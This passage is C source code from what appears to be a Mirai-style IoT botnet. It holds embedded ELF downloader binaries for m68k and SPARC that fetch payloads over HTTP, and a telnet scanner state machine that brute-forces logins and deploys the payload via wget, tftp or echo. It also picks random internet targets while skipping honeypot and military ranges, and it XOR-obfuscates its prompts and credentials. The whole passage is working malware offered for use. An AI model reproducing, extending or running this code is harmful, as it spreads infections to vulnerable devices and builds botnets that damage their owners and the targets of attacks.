8\x48\x78\x00\x03\x61\xff\x00\x00\x01\x84\x4e\x5e\x4e\x75\x4e\x56\xff\xf4\x2d\x6e\x00\x08\xff\xf4\x2d\x6e\x00\x0c\xff\xf8\x2d\x6e\x00\x10\xff\xfc\x48\x6e\xff\xf4\x48\x78\x00\x01\x48\x78\x00\x66\x61\xff\x00\x00\x01\x58\x4e\x5e\x4e\x75\x4e\x56\xff\x6c\x48\xe7\x38\x20\x45\xf9\x80\x00\x03\x30\x60\x02\x52\x8a\x4a\x12\x66\xfa\x95\xfc\x80\x00\x03\x30\x3d\x7c\x00\x02\xff\xee\x3d\x7c\x00\x50\xff\xf0\x2d\x7c\x45\x1e\xc4\x7e\xff\xf2\x48\x78\x01\xff\x48\x78\x02\x41\x48\x79\x80\x00\x03\x35\x61\xff\xff\xff\xff\x0e\x28\x00\x42\xa7\x48\x78\x00\x01\x48\x78\x00\x02\x61\xff\xff\xff\xff\x82\x26\x00\x4f\xef\x00\x18\x70\xff\xb0\x83\x67\x04\xb0\x84\x66\x0c\x48\x78\x00\x01\x61\xff\xff\xff\xfe\xb4\x58\x8f\x48\x78\x00\x10\x48\x6e\xff\xee\x2f\x03\x61\xff\xff\xff\xfe\xee\x4f\xef\x00\x0c\x4a\x80\x6c\x0c\x44\x80\x2f\x00\x61\xff\xff\xff\xfe\x90\x58\x8f\x45\xea\x00\x19\x2f\x0a\x48\x79\x80\x00\x03\x38\x2f\x03\x61\xff\xff\xff\xfe\xf2\x4f\xef\x00\x0c\xb5\xc0\x67\x0c\x48\x78\x00\x03\x61\xff\xff\xff\xfe\x68\x58\x8f\x42\x82\x48\x78\x00\x01\x48\x6e\xff\xff\x2f\x03\x61\xff\xff\xff\xfe\xea\x4f\xef\x00\x0c\x72\x01\xb2\x80\x67\x0c\x48\x78\x00\x04\x61\xff\xff\xff\xfe\x40\x58\x8f\xe1\x8a\x10\x2e\xff\xff\x49\xc0\x84\x80\x0c\x82\x0d\x0a\x0d\x0a\x66\xc8\x48\x78\x00\x80\x24\x0e\x06\x82\xff\xff\xff\x6e\x2f\x02\x2f\x03\x61\xff\xff\xff\xfe\xac\x4f\xef\x00\x0c\x4a\x80\x6f\x12\x2f\x00\x2f\x02\x2f\x04\x61\xff\xff\xff\xfe\x7a\x4f\xef\x00\x0c\x60\xd0\x2f\x03\x45\xf9\x80\x00\x00\xac\x4e\x92\x2f\x04\x4e\x92\x48\x78\x00\x05\x61\xff\xff\xff\xfd\xe4\x4f\xef\x00\x0c\x4c\xee\x04\x1c\xff\x5c\x4e\x5e\x4e\x75\x4e\x75\x4e\x56\xff\xf8\x48\xe7\x3c\x00\x20\x6e\x00\x20\x2a\x2e\x00\x1c\x28\x2e\x00\x18\x26\x2e\x00\x14\x24\x2e\x00\x10\x22\x2e\x00\x0c\x20\x2e\x00\x08\x4e\x40\x2d\x40\xff\xf8\x20\x2e\xff\xf8\x72\x82\xb2\x80\x64\x1a\x20\x2e\xff\xf8\x44\x80\x2d\x40\xff\xfc\x61\xff\x00\x00\x00\x1c\x20\xae\xff\xfc\x72\xff\x2d\x41\xff\xf8\x20\x2e\xff\xf8\x4c\xee\x00\x3c\xff\xe8\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x20\x3c\x80\x00\x23\x58\x20\x40\x4e\x5e\x4e\x75\x6d\x36\x38\x6b\x00\x2e\x7a\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x6d\x36\x38\x6b\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x80\x00\x00\x94\x00\x00\x00\x94\x00\x00\x02\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x80\x00\x03\x30\x00\x00\x03\x30\x00\x00\x00\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x80\x00\x23\x58\x00\x00\x03\x58\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x58\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1088,  0 },
    { ARCH_SPARC,  ENDIAN_BIG,     "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x01\x00\x01\x01\x80\x00\x00\x00\x34\x00\x00\x03\x98\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x03\x78\x00\x00\x03\x78\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x03\x78\x00\x02\x03\x78\x00\x02\x03\x78\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x92\x10\x00\x08\x90\x10\x20\x01\x82\x13\xc0\x00\x10\x80\x00\x96\x01\x00\x00\x00\x01\x00\x00\x00\x92\x10\x00\x08\x90\x10\x20\x06\x82\x13\xc0\x00\x10\x80\x00\x90\x01\x00\x00\x00\x01\x00\x00\x00\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x05\x82\x13\xc0\x00\x10\x80\x00\x87\x01\x00\x00\x00\x01\x00\x00\x00\x9d\xe3\xbf\x88\x92\x10\x20\x03\xf0\x27\xbf\xec\xf2\x27\xbf\xf0\xf4\x27\xbf\xf4\x94\x07\xbf\xec\x40\x00\x00\x7e\x90\x10\x20\xce\x81\xc7\xe0\x08\x91\xe8\x00\x08\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x04\x82\x13\xc0\x00\x10\x80\x00\x74\x01\x00\x00\x00\x01\x00\x00\x00\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x03\x82\x13\xc0\x00\x10\x80\x00\x6b\x01\x00\x00\x00\x01\x00\x00\x00\x9d\xe3\xbf\x88\x92\x10\x20\x01\xf0\x27\xbf\xec\xf2\x27\xbf\xf0\xf4\x27\xbf\xf4\x94\x07\xbf\xec\x40\x00\x00\x62\x90\x10\x20\xce\x81\xc7\xe0\x08\x91\xe8\x00\x08\x9d\xe3\xbf\x00\x03\x00\x00\x40\xa0\x10\x63\x48\xc2\x4c\x00\x00\x80\xa0\x60\x00\x32\xbf\xff\xfe\xa0\x04\x20\x01\x03\x00\x00\x40\x82\x10\x63\x48\xa0\x24\x00\x01\x82\x10\x20\x02\xc2\x37\xbf\xe4\x82\x10\x20\x50\xc2\x37\xbf\xe6\x03\x11\x47\xb1\x82\x10\x60\x7e\x92\x10\x26\x01\x94\x10\x21\xff\xc2\x27\xbf\xe8\x11\x00\x00\x40\x7f\xff\xff\xbd\x90\x12\x23\x50\x92\x10\x20\x01\xa4\x10\x00\x08\x94\x10\x20\x00\x7f\xff\xff\xdd\x90\x10\x20\x02\x80\xa2\x3f\xff\x02\x80\x00\x05\xa2\x10\x00\x08\x80\xa4\xbf\xff\x12\x80\x00\x05\x90\x10\x00\x11\x7f\xff\xff\xa4\x90\x10\x20\x01\x90\x10\x00\x11\x92\x07\xbf\xe4\x7f\xff\xff\xb5\x94\x10\x20\x10\x80\xa2\x20\x00\x36\x80\x00\x05\xa0\x04\x20\x19\x7f\xff\xff\x9b\x90\x20\x00\x08\xa0\x04\x20\x19\x90\x10\x00\x11\x13\x00\x00\x40\x94\x10\x00\x10\x7f\xff\xff\xb4\x92\x12\x63\x58\x80\xa2\x00\x10\x02\x80\x00\x05\xa0\x10\x20\x00\x7f\xff\xff\x90\x90\x10\x20\x03\xa0\x10\x20\x00\x92\x07\xbf\xf7\x94\x10\x20\x01\x7f\xff\xff\xb3\x90\x10\x00\x11\x80\xa2\x20\x01\x02\x80\x00\x05\xc2\x4f\xbf\xf7\x7f\xff\xff\x86\x90\x10\x20\x04\xc2\x4f\xbf\xf7\x85\x2c\x20\x08\xa0\x10\x80\x01\x03\x03\x42\x83\x82\x10\x61\x0a\x80\xa4\x00\x01\x12\xbf\xff\xf2\x92\x07\xbf\xf7\xa0\x07\xbf\x64\x90\x10\x00\x11\x92\x10\x00\x10\x7f\xff\xff\xa1\x94\x10\x20\x80\x80\xa2\x20\x00\x04\x80\x00\x07\x94\x10\x00\x08\x92\x10\x00\x10\x7f\xff\xff\x92\x90\x10\x00\x12\x10\xbf\xff\xf6\xa0\x07\xbf\x64\x7f\xff\xff\x75\x90\x10\x00\x11\x7f\xff\xff\x73\x90\x10\x00\x12\x7f\xff\xff\x6b\x90\x10\x20\x05\x81\xc7\xe0\x08\x81\xe8\x00\x00\x82\x10\x00\x08\x90\x10\x00\x09\x92\x10\x00\x0a\x94\x10\x00\x0b\x96\x10\x00\x0c\x98\x10\x00\x0d\x91\xd0\x20\x10\x0a\x80\x00\x04\x01\x00\x00\x00\x81\xc3\xe0\x08\x01\x00\x00\x00\x9d\xe3\xbf\x98\x40\x00\x00\x05\x01\x00\x00\x00\xf0\x22\x00\x00\x81\xc7\xe0\x08\x91\xe8\x3f\xff\x11\x00\x00\x80\x81\xc3\xe0\x08\x90\x12\x23\x78\x73\x70\x61\x72\x63\x00\x00\x00\x2e\x7a\x00\x00\x00\x00\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x73\x70\x61\x72\x63\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x01\x00\x94\x00\x00\x00\x94\x00\x00\x02\xb4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x01\x03\x48\x00\x00\x03\x48\x00\x00\x00\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x02\x03\x78\x00\x00\x03\x78\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x78\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1120,  0 },
};

struct scanner_struct_t
{
    struct telnet_login_t *login;
    struct parsed_elf_t elf_header;
    enum
    {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_FAIL_OR_SUCCESS,
        SC_VERIFY_LOGIN,
        SC_EXTRACT_ELF_DATA,
        SC_DETERMINE_WRITEABLE_DIR,
        SC_DETERMINE_INFECTION_METHOD,
        SC_BUILD_ECHO_PAYLOAD,
        SC_VERIFY_ECHO_PAYLOAD,
        SC_CHECK_WGET_TFTP_DEPLOY,
        SC_CHECK_ECHO_DEPLOY,
        SC_GET_CREDENTIALS,
    } v;
    ipv4_t dst_addr;
    uint16_t dst_port;
    char *arch, sockbuf[SOCKBUF_SIZE], message[SOCKBUF_SIZE], **credentials, writeable_dir[64];
    int fd, last_recv, rdbuf_pos, timeout, total_timeout, credential_index, remote_auth_index;
    uint8_t tries, run, method, retr_bin_index, echo_method, arm_tries, state, complete, got_iac;
};

static BOOL iac_negotiate(struct scanner_struct_t *ptr)
{
    int i = 0;
    int m = 0;
    uint8_t *ptr2 = ptr->sockbuf;

    for(i = 0; i < SOCKBUF_SIZE; i++)
    {
        if(*ptr2 != 0xFF)   // if what we are looking at isn't an Interpret As Command
        {
            return FALSE;   // tell them no IAC was found
        }
        else if(*ptr2 == 0xFF)  // it is an Interpret as command
        {
            if(ptr2[1] == 0xFF) // if the next byte is also FF
            {
                ptr2 += 2;      // advance over both and try again
                continue;       // skip double 0xff 0xff
            }
            else if(ptr2[1] == 0xFD) // check if next byte is a 0xFD, or TELNET DO command
            {
                uint8_t tmp_buf[3] = {255, 251, 31};                            // we WILL tell them we can do 31 ( NAWS - Negotiation of window size )
                uint8_t tmp_buf2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};   // 250 is option subnegotiation
                                                                                // basically since both sides can do 31, we tell them about option 31 settings we want
                                                                                // NAWS 0 80 0 24 255 240
                                                                                // WIDTH[1] = 0
                                                                                // WIDTH[0] = 80
                                                                                // HEIGHT[1] = 0
                                                                                // HEIGHT[1] = 24
                                                                                // IAC
                                                                                // SB
                 
                if(ptr2[2] != 31)                                               // Check if they sent something other than 31
                {
                    // we got an option that wasn't 31. 
                    // we need to tell them we dont/wont spport it


                   if(ptr2[1] == 0xFD)         // if it was do
                       ptr2[1] = 0xFC;         // tell them wont
                   else if(ptr2[1] == 0xFB)    // if it was will
                       ptr2[1] = 0xFC;         // tell them wont
                    

                    send(ptr->fd, ptr2, 3, MSG_NOSIGNAL);
                    ptr2 += 3;  // advance 3 bytes and keep processing
                    continue;
                    
                } 
                
                ptr2 += 3; // advance over their option 31 request
                
                send(ptr->fd, tmp_buf, 3, MSG_NOSIGNAL);    // send them our option 31 WILL
                send(ptr->fd, tmp_buf2, 9, MSG_NOSIGNAL);   // send them our option 31 sub negotiation
                return TRUE;
            }
        }
    }

    return TRUE;
}

static uint16_t contains_single_string(struct scanner_struct_t *ptr, char *string)
{
    int ret = util_char_search(ptr->sockbuf, ptr->rdbuf_pos, string, util_strlen(string));

    if(ret != -1)
        return ret;

    return FALSE;
}

// Function stolen from KTN-Remastered
static char *get_victim_host(struct scanner_struct_t *ptr)
{
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = ptr->dst_addr;
    return inet_ntoa(in_addr_ip);
}

// Another function also stolen from KTN-Remastered
static BOOL extract_elf_data(struct scanner_struct_t *ptr)
{
    int i = 0;
    int z = 0;
    char *elf_magic = "\x7f\x45\x4c\x46";
    char *elf = (char *)0;
    int matching = 0;

    for(i = 0; i < SOCKBUF_SIZE; i++)
    {
        if(elf != 0)
            break;

        for(z = 0; z < 4; z++)
        {
            if((i + z) < SOCKBUF_SIZE && elf_magic[z] == ptr->sockbuf[i])
            {
                elf = ptr->sockbuf + i;
                break;
            }
            else
            {
                break;
            }
        }
    }

    if(elf != 0)
    {
        int endianness = elf[0x05];
        int arch = elf[0x12] + elf[0x13];

        ptr->elf_header.arch = arch;
        ptr->elf_header.endianness = endianness;

        if(arch == 40 || arch == 183)
        {
        	ptr->elf_header.arch = 0x28;
            ptr->arch = "arm";
        }
        else if((arch == 8 && endianness == ENDIAN_BIG) || (arch == 10 && endianness == ENDIAN_BIG))
        {
        	ptr->elf_header.arch = 0x08;
            ptr->arch = "mips";
        }
        else if(arch == 8 && endianness == ENDIAN_LITTLE || (arch == 10 && endianness == ENDIAN_LITTLE))
        {
        	ptr->elf_header.arch = 0x08;
            ptr->arch = "mipsel";
        }
        else if(arch == 20)
        {
            ptr->elf_header.arch = 0x14;
            ptr->arch = "powerpc";
        }
        else if(arch == 42)
        {
            ptr->elf_header.arch = 0x2A;
            ptr->arch = "sh4";
        }
        else if(arch == 4 || arch == 5 || arch == 1)
        {
            ptr->elf_header.arch = 0x04;
            ptr->arch = "m68k";
        }
        else if(arch == 2 || arch == 43 || arch == 18)
        {
        	ptr->elf_header.arch = 0x02;
            ptr->arch = "sparc";
        }
        else
        {
            return FALSE;
        }

        #ifdef DEBUG
            printf("[telnet scan/%d] ELF header detected - %s:%s:%s\n", ptr->fd, get_victim_host(ptr), endianness == ENDIAN_BIG ? "ENDIAN_BIG" : "ENDIAN_LITTLE", ptr->arch);
        #endif

        return TRUE;
    }

    return FALSE;
}

// Another function stolen from KTN-Remastered
static struct retrieve_bin_t *get_retrieve_binary(struct scanner_struct_t *ptr)
{
    int i = 0;
    struct retrieve_bin_t *retrbin = &retr_bins[0];

    while(retrbin)
    {
        if(i == retrbin_count)
            break;

        if(ptr->elf_header.arch == retrbin->arch && ptr->elf_header.endianness == retrbin->endianness)
        {
            return retrbin;
        }

        retrbin++;
        i++;
    }

    return FALSE;
}

// Another function stolen from KTN-Remastered
static void process_retrieve_lines(struct retrieve_bin_t *retrbin)
{
    int max_len = MAX_ECHO_BYTES;
    int buffer_max = max_len * 3 + 1;
    char *start = retrbin->binary;
    char **retr_lines = (char **)calloc(1, sizeof(char **) * 50);
    char buffer[buffer_max], add[5];
    char *buffer2 = (char *)buffer;
    uint8_t cur_char = 0;
    int i = 0, j = 0, cur_count = 0, buffer_len = 0;
    int line = -1;
    int chars_added = 0;

    memset(buffer, 0, buffer_max);

    while(TRUE)
    {
        if(retrbin->binary_len == cur_count)
            break;

        while(TRUE)
        {
            if(buffer_len > max_len || cur_count + i == retrbin->binary_len)
                break;

            cur_char = (uint8_t)start[chars_added++];

            if(util_isprint(cur_char) && (0 == 1))
            {
                buffer[util_strlen(buffer)] = cur_char;
                buffer_len++;
                continue;
            }
            
            memset(add, 0, 5);
            sprintf(add, "\\x%x", cur_char);

            if(util_strlen(add) == 3)
            {
                add[3] = add[2];
                add[2] = '0';
            }

            for(j = 0; j < 4; j++)
                buffer[buffer_len++] = add[j];
            i = i + 1;
        }

        cur_count += i;
        buffer_len = 0;
        line = line + 1;
        retr_lines[line] = (char *)calloc(1, sizeof(char *) + max_len + 20);
        util_memcpy(retr_lines[line], buffer2, util_strlen(buffer2));
        memset(buffer, 0, buffer_max);
        i = 0;
    }

    retrbin->retr_line_num = line + 1;
    retrbin->retr_lines = retr_lines;
}

// ANOTHER function stolen from KTN-Remastered
static char *get_retrieve_line(struct retrieve_bin_t *retrbin, int index)
{
    return retrbin->retr_lines[index];
}

static ipv4_t get_random_ip(void)
{
    uint8_t ip_state[4] = {0};

    do
    {
        ip_state[0] = rand_new() % 0xff;
        ip_state[1] = rand_new() % 0xff;
        ip_state[2] = rand_new() % 0xff;
        ip_state[3] = rand_new() % 0xff;
    }
    while(ip_state[0] == 127 ||                             // 127.0.0.0/8      - Loopback
         (ip_state[0] == 0) ||                              // 0.0.0.0/8        - Invalid address space
         (ip_state[0] == 10) ||                             // 10.0.0.0/8       - Internal network
         (ip_state[0] == 192 && ip_state[1] == 168) ||               // 192.168.0.0/16   - Internal network
         (ip_state[0] == 172 && ip_state[1] >= 16 && ip_state[1] < 32) ||     // 172.16.0.0/14    - Internal network
         (ip_state[0] == 100 && ip_state[1] >= 64 && ip_state[1] < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
         (ip_state[0] == 169 && ip_state[1] > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
         (ip_state[0] == 198 && ip_state[1] >= 18 && ip_state[1] < 20) ||     // 198.18.0.0/15    - IANA Special use
         (ip_state[0] >= 224) ||                            // 224.*.*.*+       - Multicast
         (ip_state[0] == 106 && ip_state[1] == 185 || ip_state[0] == 106 && ip_state[1] == 187 || ip_state[0] == 106 && ip_state[1] == 184) || ip_state[0] == 106 && ip_state[1] == 186 ||                                           // Annoying Honeypot network
         (ip_state[0] == 6) || // 6.0.0.0/8 - USAIAC
         (ip_state[0] == 11) // 11.0.0.0/8 - DoD
    );

    return INET_ADDR(ip_state[0],ip_state[1],ip_state[2],ip_state[3]);
}

static struct telnet_login_t *retrieve_login(void)
{
    struct telnet_login_t *ptr = start;
    uint16_t rand_num = (uint16_t)(rand_new() % max_weight); 
    while(ptr)
    {
        if(rand_num < ptr->weight_min)
        {
            ptr = ptr->next;
            continue;
        }
        else if(rand_num < ptr->weight_max)
        {
            #ifdef DEBUG
                //printf("[retrieve login] Retrieved %s:%s\n", ptr->username, ptr->password);
            #endif
            return ptr;
        }
        ptr = ptr->next;
    }
}

static struct telnet_prompts_t *create_prompt_list(void)
{
    struct telnet_prompts_t *ptr = (struct telnet_prompts_t *)malloc(sizeof(struct telnet_prompts_t));
    ptr->next = NULL;
    ptr->id = 0;
    s = c = ptr;
};

static void load_prompt(int id, char *str, int str_len)
{
    int i = 0;
    uint8_t k1 = XOR_KEY & 0xff, k2 = (XOR_KEY >> 8) & 0xff, k3 = (XOR_KEY >> 16) & 0xff, k4 = (XOR_KEY >> 24) & 0xff;
    struct telnet_prompts_t *ptr = (struct telnet_prompts_t *)malloc(sizeof(struct telnet_prompts_t));
    ptr->str = (char *)malloc(str_len);
    util_memcpy(ptr->str, str, str_len);
    for(i = 0; i < str_len; i++)
    {
        ptr->str[i] ^= k1;
        ptr->str[i] ^= k2;
        ptr->str[i] ^= k3;
        ptr->str[i] ^= k4;
    }
    ptr->id = id;
    ptr->next = NULL;
    c->next = ptr;
    c = ptr;
    #ifdef DEBUG
        //printf("[entry/prompt/%d] Loaded prompt %s:%d\n", id, ptr->str, str_len);
    #endif
}

static void init_prompts(void)
{
    create_prompt_list();
    // :
    load_prompt(TELNET_LOGIN_PROMPTS, "\x3D", 1);
    // ogin
    load_prompt(TELNET_LOGIN_PROMPTS, "\x68\x60\x6E\x69", 4);
    // sername
    load_prompt(TELNET_LOGIN_PROMPTS, "\x74\x62\x75\x69\x66\x6A\x62", 7);
    // vrdvs
    load_prompt(TELNET_LOGIN_PROMPTS, "\x71\x75\x63\x71\x74", 5);
    // ccount
    load_prompt(TELNET_LOGIN_PROMPTS, "\x64\x64\x68\x72\x69\x73", 6);
    // enter
    load_prompt(TELNET_LOGIN_PROMPTS, "\x62\x69\x73\x62\x75", 5);
    // assword
    load_prompt(TELNET_LOGIN_PROMPTS, "\x66\x74\x74\x70\x68\x75\x63", 7);
    // usybox
    load_prompt(TELNET_LOGIN_PROMPTS, "\x72\x74\x7E\x65\x68\x7F", 6);
    // ulti-call
    load_prompt(TELNET_LOGIN_PROMPTS, "\x72\x6B\x73\x6E\x2A\x64\x66\x6B\x6B", 9);
    // help
    load_prompt(TELNET_LOGIN_PROMPTS, "\x6F\x62\x6B\x77", 4);
    // $
    load_prompt(TELNET_LOGIN_PROMPTS, "\x23", 1);
    // #
    load_prompt(TELNET_LOGIN_PROMPTS, "\x24", 1);
    // >
    load_prompt(TELNET_LOGIN_PROMPTS, "\x39", 1);
    // ~
    load_prompt(TELNET_LOGIN_PROMPTS, "\x79", 1);
    // Fails
    // nvalid
    load_prompt(TELNET_FAIL_PROMPTS, "\x69\x71\x66\x6B\x6E\x63", 6);
    // ailed
    load_prompt(TELNET_FAIL_PROMPTS, "\x66\x6E\x6B\x62\x63", 5);
    // ncorrect
    load_prompt(TELNET_FAIL_PROMPTS, "\x69\x64\x68\x75\x75\x62\x64\x73", 8);
    // enied
    load_prompt(TELNET_FAIL_PROMPTS, "\x62\x69\x6E\x62\x63", 5);
    // rror
    load_prompt(TELNET_FAIL_PROMPTS, "\x75\x75\x68\x75", 4);
    // oodbye
    load_prompt(TELNET_FAIL_PROMPTS, "\x68\x68\x63\x65\x7E\x62", 6);
    // bad
    load_prompt(TELNET_FAIL_PROMPTS, "\x65\x66\x63", 3);
    // Successes
    // usybox
    load_prompt(TELNET_SUCCESS_PROMPTS, "\x72\x74\x7E\x65\x68\x7F", 6);
    // ulti-call
    load_prompt(TELNET_SUCCESS_PROMPTS, "\x72\x6B\x73\x6E\x2A\x64\x66\x6B\x6B", 9);
    // help
    load_prompt(TELNET_SUCCESS_PROMPTS, "\x6F\x62\x6B\x77", 4);
    // $
    load_prompt(TELNET_SUCCESS_PROMPTS, "\x23", 1);
    // #
    load_prompt(TELNET_SUCCESS_PROMPTS, "\x24", 1);
    // >
    load_prompt(TELNET_SUCCESS_PROMPTS, "\x39", 1);
    // ~
    load_prompt(TELNET_SUCCESS_PROMPTS, "\x79", 1);
    // Fail or Successes
    // nvalid
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x69\x71\x66\x6B\x6E\x63", 6);
    // ailed
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x66\x6E\x6B\x62\x63", 5);
    // ncorrect
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x69\x64\x68\x75\x75\x62\x64\x73", 8);
    // enied
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x62\x69\x6E\x62\x63", 5);
    // rror
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x75\x75\x68\x75", 4);
    // oodbye
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x68\x68\x63\x65\x7E\x62", 6);
    // bad
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x65\x66\x63", 3);
    // usybox
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x72\x74\x7E\x65\x68\x7F", 6);
    // ulti-call
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x72\x6B\x73\x6E\x2A\x64\x66\x6B\x6B", 9);
    // help
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x6F\x62\x6B\x77", 4);
    // $
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x23", 1);
    // #
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x24", 1);
    // >
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x39", 1);
    // ~
    load_prompt(TELNET_FAIL_OR_SUCCESS_PROMPTS, "\x79", 1);
}

static int compare_telnet_prompts(int id, struct scanner_struct_t *ptr2)
{
    int ret = 0;
    struct telnet_prompts_t *ptr = s;
    uint8_t *x = ptr2->sockbuf;

    if(*x == 0xff && !ptr2->got_iac)
    {
        #ifdef DEBUG
        	//printf("[telnet scan/%d] IAC negotiation? - %s\n", ptr2->fd, get_victim_host(ptr2));
        #endif
        ret = iac_negotiate(ptr2);
        if(!ret)
        {
            #ifdef DEBUG
               // printf("[telnet scan/%d] Failed to negotiate with IAC - %s\n", ptr2->fd, get_victim_host(ptr2));
            #endif
            return 0;
        }
        #ifdef DEBUG
            //printf("[telnet scan/%d] IAC negotiation success - %s\n", ptr2->fd, get_victim_host(ptr2));
        #endif
        ptr2->got_iac = TRUE;
    }

    while(ptr)
    {
        if(ptr->id != id)
        {
            ptr = ptr->next;
            continue;
        }
        if(GET_UID != 0)
        {
            if((ret = util_char_search(ptr2->sockbuf, sizeof(ptr2->sockbuf), ptr->str, util_strlen(ptr->str))) != -1)
            {
                #ifdef DEBUG
                    //printf("[entry/prompt/%d] Matched prompt %s\n", id, ptr->str);
                #endif
                return ret;
            }
        }
        else
        {
            if((ret = util_char_search(ptr2->sockbuf, ptr2->rdbuf_pos, ptr->str, util_strlen(ptr->str))) != -1)
            {
            	#ifdef DEBUG
                	//printf("[entry/prompt/%d] Matched prompt %s\n", id, ptr->str);
            	#endif
            	return ret;
            }
        }
        ptr = ptr->next;
    }
    #ifdef DEBUG
        //printf("[entry/prompt/] failed\n");
    #endif

    return 0;
}

static struct telnet_login_t *create_login_list(void)
{
    struct telnet_login_t *ptr = (struct telnet_login_t *)malloc(sizeof(struct telnet_login_t));
    ptr->next = NULL;
    ptr->index = 0;
    start = current = ptr;
}

static void load_login(int weight, char *username, char *password)
{
    int i = 0;
    uint8_t k1 = XOR_KEY & 0xff, k2 = (XOR_KEY >> 8) & 0xff, k3 = (XOR_KEY >> 16) & 0xff, k4 = (XOR_KEY >> 24) & 0xff;
    uint8_t username_len = util_strlen(username);
    uint8_t password_len = util_strlen(password);
    struct telnet_login_t *ptr = (struct telnet_login_t *)malloc(sizeof(struct telnet_login_t));
    ptr->username = (char *)malloc(username_len);
    util_memcpy(ptr->username, username, username_len);
    for(i = 0; i < username_len; i++)
    {
        ptr->username[i] ^= k1;
        ptr->username[i] ^= k2;
        ptr->username[i] ^= k3;
        ptr->username[i] ^= k4;
    }
    ptr->password = (char *)malloc(password_len);
    util_memcpy(ptr->password, password, password_len);
    for(i = 0; i < password_len; i++)
    {
        ptr->password[i] ^= k1;
        ptr->password[i] ^= k2;
        ptr->password[i] ^= k3;
        ptr->password[i] ^= k4;
    }
    ptr->username_len = username_len;
    ptr->password_len = password_len;
    ptr->weight_min = max_weight;
    ptr->weight_max = max_weight + weight;
    max_weight += weight;
    ptr->next = NULL;
